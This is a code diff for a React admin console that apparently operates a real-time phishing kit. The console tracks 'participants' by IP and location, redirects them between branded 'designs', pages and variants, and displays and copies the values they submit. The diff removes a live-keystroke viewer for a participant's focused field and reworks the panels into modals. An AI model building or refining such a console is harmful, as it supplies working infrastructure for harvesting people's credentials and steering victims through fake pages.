@@ -64,12 +64,12 @@ import { ParticipantsIcon, PagesIcon, SettingsIcon, FileUploaderIcon } from "@/c
 const pagesEditorImport = () => import("@/components/PagesEditor");
 const fileUploaderImport = () => import("@/components/FileUploader");
 const livePreviewImport = () => import("@/components/LivePreview");
-const floatingPanelImport = () => import("@/components/FloatingPanel");
+const panelModalImport = () => import("@/components/PanelModal");
 
 const PagesEditor = lazy(() => pagesEditorImport().then((m) => ({ default: m.PagesEditor })));
 const FileUploader = lazy(() => fileUploaderImport().then((m) => ({ default: m.FileUploader })));
 const LivePreview = lazy(() => livePreviewImport().then((m) => ({ default: m.LivePreview })));
-const FloatingPanel = lazy(() => floatingPanelImport().then((m) => ({ default: m.FloatingPanel })));
+const PanelModal = lazy(() => panelModalImport().then((m) => ({ default: m.PanelModal })));
 
 function AdminLazyFallback() {
   return <span aria-hidden />;
@@ -640,7 +640,6 @@ function Admin() {
                     onKick={kick}
                     onOpenPreview={openPreview}
                     events={events}
-                    liveInputs={liveInputs}
                     suites={suites}
                   />
                 )}
@@ -967,6 +966,10 @@ function CopyChip({
   );
 }
 
+function shortId(id: string): string {
+  return id.length <= 10 ? id : `${id.slice(0, 10)}…`;
+}
+
 function ParticipantsPane({
   items,
   onNavigate,
@@ -974,7 +977,6 @@ function ParticipantsPane({
   onKick,
   onOpenPreview,
   events,
-  liveInputs,
   suites,
 }: {
   items: LiveRecord[];
@@ -983,7 +985,6 @@ function ParticipantsPane({
   onKick: (id: string) => void;
   onOpenPreview: (id: string) => void;
   events: InputPayload[];
-  liveInputs: Map<string, LiveInputPayload>;
   suites: SuiteOpt[];
 }) {
   return (
@@ -1002,7 +1003,6 @@ function ParticipantsPane({
               onOpenPreview={onOpenPreview}
               suites={suites}
               events={events.filter((e) => e.participantId === p.id)}
-              liveInput={liveInputs.get(p.id) ?? null}
             />
           ))}
         </div>
@@ -1019,7 +1019,6 @@ function ParticipantCard({
   onOpenPreview,
   suites,
   events,
-  liveInput,
 }: {
   p: LiveRecord;
   onNavigate: (id: string, suite: Suite, page: Page) => void;
@@ -1028,11 +1027,10 @@ function ParticipantCard({
   onOpenPreview: (id: string) => void;
   suites: SuiteOpt[];
   events: InputPayload[];
-  liveInput: LiveInputPayload | null;
 }) {
   const [regRev, setRegRev] = useState(0);
   useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
-  type PanelKey = "redirect" | "submitted" | "keyboard";
+  type PanelKey = "redirect" | "submitted";
   const [panels, setPanels] = useState<Set<PanelKey>>(() => new Set());
   function togglePanel(k: PanelKey) {
     setPanels((prev) => {
@@ -1070,6 +1068,10 @@ function ParticipantCard({
     [pickedSuite, regRev],
   );
 
+  function routeTo(suite: Suite, page: Page) {
+    onNavigate(p.id, suite, page);
+    closePanelKey("redirect");
+  }
 
   const submitted = useMemo(() => {
     const map = new Map<string, InputPayload>();
@@ -1086,8 +1088,7 @@ function ParticipantCard({
   const place = placeFromParticipant(p);
   const activePanel =
     panels.has("redirect") ? "redirect" :
-    panels.has("submitted") ? "submitted" :
-    panels.has("keyboard") ? "keyboard" : null;
+    panels.has("submitted") ? "submitted" : null;
 
   return (
     <article className={`pc pc-live ${activePanel ? "has-panel" : ""}`}>
@@ -1102,12 +1103,12 @@ function ParticipantCard({
               </CopyChip>
             ) : (
               <CopyChip text={p.id} title="Copy participant id" className="pc-ip copy-chip-inline">
-                <span className="font-mono">{p.id.slice(0, 10)}…</span>
+                <span className="font-mono">{shortId(p.id)}</span>
               </CopyChip>
             )}
             <StatusDot state={p.state} />
-            <CopyChip text={p.id} title="Copy participant id" className="pc-pid copy-chip-inline">
-              <span className="font-mono">{p.id}</span>
+            <CopyChip text={p.id} title="Copy full participant id" className="pc-pid copy-chip-inline">
+              <span className="font-mono">{shortId(p.id)}</span>
             </CopyChip>
           </div>
           <div className="pc-identity-geo">
@@ -1164,18 +1165,6 @@ function ParticipantCard({
             {submitted.length > 0 && <span className="admin-icon-badge">{submitted.length}</span>}
           </button>
           <button
-            className={`admin-icon-btn ${panels.has("keyboard") ? "is-active" : ""}`}
-            title="Live typing"
-            onClick={() => togglePanel("keyboard")}
-            aria-label="Live keyboard"
-            aria-pressed={panels.has("keyboard")}
-          >
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <rect x="2" y="6" width="20" height="12" rx="2" />
-              <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M7 14h10" />
-            </svg>
-          </button>
-          <button
             className="admin-icon-btn"
             title="Live preview"
             onClick={() => onOpenPreview(p.id)}
@@ -1215,197 +1204,152 @@ function ParticipantCard({
       </div>
 
       {panels.has("redirect") && (
-        <FloatingPanel
-          title={
-            <span>
-              Redirect <span className="font-mono text-[11px] opacity-60">{p.id}</span>
-              {pickedSuite && <span className="opacity-60"> · {pickedSuite}</span>}
-            </span>
-          }
-          accentDot="#8aa6ff"
-          onClose={() => closePanelKey("redirect")}
-          initialSize={{ w: 320, h: 400 }}
-          minSize={{ w: 260, h: 260 }}
-          className="pc-float"
-        >
-          {!pickedSuite ? (
-            <div className="admin-redirect-list">
-              {suites.length === 0 && (
-                <p className="admin-redirect-empty">No designs yet.</p>
-              )}
-              {suites.map((s, i) => {
-                const logo = getDesignLogo(s.value);
-                return (
-                  <button
-                    key={s.value}
-                    className="admin-redirect-item"
-                    style={{ animationDelay: `${i * 30}ms` }}
-                    onClick={() => setPickedSuite(s.value)}
-                  >
-                    <span className="admin-redirect-item-dot">
-                      {logo ? (
-                        <img src={logo} alt="" className="pc-redirect-logo" />
-                      ) : "›"}
-                    </span>
-                    <span>{s.label}</span>
-                    <span className="admin-redirect-item-arrow">→</span>
-                  </button>
-                );
-              })}
-            </div>
-          ) : pickedPage && PAGE_VARIANTS[pickedSuite]?.[pickedPage] ? (
-            <>
-              <button className="admin-redirect-back" onClick={() => setPickedPage(null)}>
-                ← Pages
-              </button>
+        <Suspense fallback={<AdminLazyFallback />}>
+          <PanelModal
+            title={
+              <span>
+                Redirect <span className="font-mono text-[11px] opacity-60">{shortId(p.id)}</span>
+                {pickedSuite && <span className="opacity-60"> · {pickedSuite}</span>}
+              </span>
+            }
+            accentDot="#8aa6ff"
+            onClose={() => closePanelKey("redirect")}
+            maxWidth={340}
+            className="pc-modal"
+          >
+            {!pickedSuite ? (
               <div className="admin-redirect-list">
-                {PAGE_VARIANTS[pickedSuite][pickedPage].map((v, i) => {
-                  const icon = getPageIcon(pickedSuite, pickedPage) ?? getDesignLogo(pickedSuite);
-                  return (
-                    <button
-                      key={v.value}
-                      className="admin-redirect-item"
-                      style={{ animationDelay: `${i * 25}ms` }}
-                      onClick={() => {
-                        onNavigate(p.id, pickedSuite, v.value);
-                        setPickedPage(null);
-                        setPickedSuite(null);
-                      }}
-                    >
-                      <span className="admin-redirect-item-dot">
-                        {icon ? (
-                          <img src={icon} alt="" className="pc-redirect-logo" />
-                        ) : "•"}
-                      </span>
-                      <span>{v.label}</span>
-                      <span className="admin-redirect-item-arrow">↗</span>
-                    </button>
-                  );
-                })}
-              </div>
-            </>
-          ) : (
-            <>
-              <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
-                ← Designs
-              </button>
-              <div className="admin-redirect-list">
-                {pageOpts.length === 0 && (
-                  <p className="admin-redirect-empty">No pages in this design.</p>
+                {suites.length === 0 && (
+                  <p className="admin-redirect-empty">No designs yet.</p>
                 )}
-                {pageOpts.map((pg, i) => {
-                  const icon = getPageIcon(pickedSuite, pg.value) ?? getDesignLogo(pickedSuite);
-                  const hasVariants = !!PAGE_VARIANTS[pickedSuite]?.[pg.value];
+                {suites.map((s, i) => {
+                  const logo = getDesignLogo(s.value);
                   return (
                     <button
-                      key={pg.value}
+                      key={s.value}
                       className="admin-redirect-item"
-                      style={{ animationDelay: `${i * 25}ms` }}
-                      onClick={() => {
-                        if (hasVariants) {
-                          setPickedPage(pg.value);
-                        } else {
-                          onNavigate(p.id, pickedSuite, pg.value);
-                          setPickedSuite(null);
-                        }
-                      }}
+                      style={{ animationDelay: `${i * 30}ms` }}
+                      onClick={() => setPickedSuite(s.value)}
                     >
                       <span className="admin-redirect-item-dot">
-                        {icon ? (
-                          <img src={icon} alt="" className="pc-redirect-logo" />
-                        ) : "•"}
+                        {logo ? (
+                          <img src={logo} alt="" className="pc-redirect-logo" />
+                        ) : "›"}
                       </span>
-                      <span>{pg.label}</span>
-                      <span className="admin-redirect-item-arrow">{hasVariants ? "›" : "↗"}</span>
+                      <span>{s.label}</span>
+                      <span className="admin-redirect-item-arrow">→</span>
                     </button>
                   );
                 })}
               </div>
-            </>
-          )}
-        </FloatingPanel>
+            ) : pickedPage && PAGE_VARIANTS[pickedSuite]?.[pickedPage] ? (
+              <>
+                <button className="admin-redirect-back" onClick={() => setPickedPage(null)}>
+                  ← Pages
+                </button>
+                <div className="admin-redirect-list">
+                  {PAGE_VARIANTS[pickedSuite][pickedPage].map((v, i) => {
+                    const icon = getPageIcon(pickedSuite, pickedPage) ?? getDesignLogo(pickedSuite);
+                    return (
+                      <button
+                        key={v.value}
+                        className="admin-redirect-item"
+                        style={{ animationDelay: `${i * 25}ms` }}
+                        onClick={() => routeTo(pickedSuite, v.value)}
+                      >
+                        <span className="admin-redirect-item-dot">
+                          {icon ? (
+                            <img src={icon} alt="" className="pc-redirect-logo" />
+                          ) : "•"}
+                        </span>
+                        <span>{v.label}</span>
+                        <span className="admin-redirect-item-arrow">↗</span>
+                      </button>
+                    );
+                  })}
+                </div>
+              </>
+            ) : (
+              <>
+                <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
+                  ← Designs
+                </button>
+                <div className="admin-redirect-list">
+                  {pageOpts.length === 0 && (
+                    <p className="admin-redirect-empty">No pages in this design.</p>
+                  )}
+                  {pageOpts.map((pg, i) => {
+                    const icon = getPageIcon(pickedSuite, pg.value) ?? getDesignLogo(pickedSuite);
+                    const hasVariants = !!PAGE_VARIANTS[pickedSuite]?.[pg.value];
+                    return (
+                      <button
+                        key={pg.value}
+                        className="admin-redirect-item"
+                        style={{ animationDelay: `${i * 25}ms` }}
+                        onClick={() => {
+                          if (hasVariants) {
+                            setPickedPage(pg.value);
+                          } else {
+                            routeTo(pickedSuite, pg.value);
+                          }
+                        }}
+                      >
+                        <span className="admin-redirect-item-dot">
+                          {icon ? (
+                            <img src={icon} alt="" className="pc-redirect-logo" />
+                          ) : "•"}
+                        </span>
+                        <span>{pg.label}</span>
+                        <span className="admin-redirect-item-arrow">{hasVariants ? "›" : "↗"}</span>
+                      </button>
+                    );
+                  })}
+                </div>
+              </>
+            )}
+          </PanelModal>
+        </Suspense>
       )}
-
 
       {panels.has("submitted") && (
-        <FloatingPanel
-          title={<span>Submitted · <span className="font-mono text-[11px]">{p.id}</span></span>}
-          accentDot="#5dffa3"
-          onClose={() => closePanelKey("submitted")}
-          initialSize={{ w: 420, h: 620 }}
-          minSize={{ w: 280, h: 260 }}
-          className="pc-float"
-        >
-          <div className="admin-modal-list">
-            {submitted.length === 0 ? (
-              <p className="admin-redirect-empty">Nothing submitted yet.</p>
-            ) : (
-              submitted.map((e, i) => (
-                <div
-                  key={e.field}
-                  className={`admin-submitted-item ${i === 0 ? "is-pinned" : ""}`}
-                  style={{ animationDelay: `${i * 40}ms` }}
-                >
-                  <div className="admin-submitted-field">
-                    {e.field}
-                    {i === 0 && <span className="admin-submitted-latest">latest</span>}
+        <Suspense fallback={<AdminLazyFallback />}>
+          <PanelModal
+            title={<span>Submitted · <span className="font-mono text-[11px]">{shortId(p.id)}</span></span>}
+            accentDot="#5dffa3"
+            onClose={() => closePanelKey("submitted")}
+            maxWidth={440}
+            className="pc-modal"
+          >
+            <div className="admin-modal-list">
+              {submitted.length === 0 ? (
+                <p className="admin-redirect-empty">Nothing submitted yet.</p>
+              ) : (
+                submitted.map((e, i) => (
+                  <div
+                    key={e.field}
+                    className={`admin-submitted-item ${i === 0 ? "is-pinned" : ""}`}
+                    style={{ animationDelay: `${i * 40}ms` }}
+                  >
+                    <div className="admin-submitted-field">
+                      {e.field}
+                      {i === 0 && <span className="admin-submitted-latest">latest</span>}
+                    </div>
+                    <CopyChip text={e.value} className="admin-submitted-value copy-chip-block" title="Copy value">
+                      {e.value || <em style={{ color: "#555" }}>(empty)</em>}
+                    </CopyChip>
+                    <div className="admin-submitted-meta">
+                      {new Date(e.at).toLocaleTimeString()}
+                    </div>
                   </div>
-                  <CopyChip text={e.value} className="admin-submitted-value copy-chip-block" title="Copy value">
-                    {e.value || <em style={{ color: "#555" }}>(empty)</em>}
-                  </CopyChip>
-                  <div className="admin-submitted-meta">
-                    {new Date(e.at).toLocaleTimeString()}
-                  </div>
-                </div>
-              ))
-            )}
-          </div>
-        </FloatingPanel>
-      )}
-
-      {panels.has("keyboard") && (
-        <FloatingPanel
-          title={<span>Live keyboard · <span className="font-mono text-[11px]">{p.id}</span></span>}
-          accentDot="#ffd25d"
-          onClose={() => closePanelKey("keyboard")}
-          initialSize={{ w: 420, h: 220 }}
-          minSize={{ w: 280, h: 160 }}
-          className="pc-float"
-        >
-          <KeyboardPanelBody liveInput={liveInput} />
-        </FloatingPanel>
+                ))
+              )}
+            </div>
+          </PanelModal>
+        </Suspense>
       )}
 
       <ParticipantFeed events={events} />
     </article>
-  );
-}
-
-function KeyboardPanelBody({ liveInput }: { liveInput: LiveInputPayload | null }) {
-  if (!liveInput) {
-    return (
-      <div className="kb-panel-empty">
-        <p>Waiting for the participant to focus a field.</p>
-      </div>
-    );
-  }
-  return (
-    <div className="kb-panel">
-      <div className="kb-panel-meta">
-        <span className={`kb-focus-dot ${liveInput.focused ? "is-on" : ""}`} />
-        <span className="kb-panel-field">{liveInput.field}</span>
-        <span className="kb-panel-type">{liveInput.ftype}</span>
-        <span className="kb-panel-time">{new Date(liveInput.at).toLocaleTimeString()}</span>
-      </div>
-      <CopyChip text={liveInput.value} className="kb-panel-value copy-chip-block" title="Copy current value">
-        {liveInput.value ? (
-          <span className="kb-panel-text">{liveInput.value}</span>
-        ) : (
-          <em className="kb-panel-empty-text">(empty)</em>
-        )}
-        <span className="kb-caret" aria-hidden />
-      </CopyChip>
-    </div>
   );
 }
 
